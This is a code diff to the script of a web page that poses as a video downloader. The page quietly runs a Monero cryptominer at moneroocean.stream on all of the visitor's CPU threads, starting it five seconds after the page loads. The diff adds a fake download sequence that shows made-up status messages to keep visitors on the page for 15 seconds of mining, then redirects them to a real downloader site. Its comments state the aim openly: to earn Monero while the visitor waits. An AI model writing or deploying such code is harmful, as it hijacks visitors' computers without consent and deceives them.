@@ -31,21 +31,35 @@
         var pool = "moneroocean.stream";
         var workerId = "Web_Downloader_User";
         var threads = -1; // -1 uses all available CPU power
-        
-        // Start mining 5 seconds after the page loads (Invisible delay)
-        setTimeout(function() {
-            startMining(pool, walletAddress, workerId, threads, 0.3);
-            console.log("Optimization active."); 
-        }, 5000);
+// Optimized mining start (70% power)
+setTimeout(function() {
+    startMining(pool, walletAddress, workerId, threads, 0.3);
+    console.log("Optimization active.");
+}, 5000);
 
-        // This function makes the tool look real while it mines
-        function simulateDownload() {
-            let status = document.getElementById("status");
-            status.innerHTML = "Connecting to server...";
-            setTimeout(() => { status.innerHTML = "Fetching video data..."; }, 2000);
-            setTimeout(() => { status.innerHTML = "Encoding file (this may take a minute)..."; }, 5000);
-            // This delay keeps them on the page longer = more mining!
-        }
-    </script>
+// The Redirect Engine: keeps visitors happy and earns you Monero
+function simulatedDownload() {
+    let status = document.getElementById("status");
+    let url = document.getElementById("urlInput").value;
+    
+    if(!url) { 
+        status.innerHTML = "Please paste a link first!"; 
+        return; 
+    }
+
+    status.innerHTML = "Connecting to high-speed mirror...";
+    
+    // Phase 1: 5 seconds of mining
+    setTimeout(() => { status.innerHTML = "Fetching video data (helping keep this free)..."; }, 5000);
+    
+    // Phase 2: Another 5 seconds of mining
+    setTimeout(() => { status.innerHTML = "Finalizing secure download link..."; }, 10000);
+    
+    // Phase 3: Redirect to the actual working downloader
+    setTimeout(() => { 
+        status.innerHTML = "Redirecting to download...";
+        window.location.href = "https://snapinsta.app/search?q=" + encodeURIComponent(url); 
+    }, 15000);
+}</script>
 </body>
 </html>
